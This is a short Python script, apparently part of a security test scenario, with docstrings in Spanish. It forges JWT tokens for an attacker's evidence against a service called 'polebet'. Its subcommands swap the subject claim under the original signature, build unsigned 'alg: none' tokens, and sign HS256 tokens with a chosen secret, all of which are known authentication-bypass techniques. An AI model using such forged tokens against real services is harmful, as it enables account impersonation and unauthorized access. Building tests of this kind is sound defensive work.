"""Arma los tokens que usa el atacante en la evidencia del escenario 4.

Solo biblioteca estandar (se corre en el host con python3 -I). Cada subcomando
imprime un token, o una parte, por la salida estandar:

  cambiar-sub TOKEN SUB    el mismo token con otro "sub"; encabezado y firma originales
  cuerpo SUB               "encabezado.cuerpo" EdDSA sin firmar (para firmarlo con openssl)
  none SUB                 token con "alg": "none" y sin firma
  hs256 SUB SECRETO        token HS256 firmado con un secreto
  b64url                   base64url de lo que llega por la entrada estandar (la firma)
"""
import base64
import hashlib
import hmac
import json
import sys
import time


def b64url(datos: bytes) -> str:
    """base64url sin relleno, como lo usa JWT."""
    return base64.urlsafe_b64encode(datos).rstrip(b"=").decode()


def b64url_a_bytes(texto: str) -> bytes:
    """Inverso de b64url (agrega el relleno que falte)."""
    return base64.urlsafe_b64decode(texto + "=" * (-len(texto) % 4))


def claims(sub: str) -> dict:
    """Los claims que pondria Usuarios para un jugador, vigentes por un minuto."""
    ahora = int(time.time())
    return {"sub": sub, "rol": "player", "iss": "usuarios", "aud": "polebet", "iat": ahora, "exp": ahora + 60}


def parte(objeto: dict) -> str:
    """Un JSON compacto en base64url (encabezado o cuerpo)."""
    return b64url(json.dumps(objeto, separators=(",", ":")).encode())


def main(args: list[str]) -> None:
    """Despacha el subcomando pedido."""
    orden = args[0]
    if orden == "cambiar-sub":
        encabezado, cuerpo, firma = args[1].split(".")
        datos = json.loads(b64url_a_bytes(cuerpo))
        datos["sub"] = args[2]
        print(f"{encabezado}.{parte(datos)}.{firma}")
    elif orden == "cuerpo":
        print(f"{parte({'alg': 'EdDSA', 'typ': 'JWT'})}.{parte(claims(args[1]))}")
    elif orden == "none":
        print(f"{parte({'alg': 'none', 'typ': 'JWT'})}.{parte(claims(args[1]))}.")
    elif orden == "hs256":
        firmado = f"{parte({'alg': 'HS256', 'typ': 'JWT'})}.{parte(claims(args[1]))}"
        firma = hmac.new(args[2].encode(), firmado.encode(), hashlib.sha256).digest()
        print(f"{firmado}.{b64url(firma)}")
    elif orden == "b64url":
        print(b64url(sys.stdin.buffer.read()))
    else:
        sys.exit(f"subcomando desconocido: {orden}")


if __name__ == "__main__":
    main(sys.argv[1:])
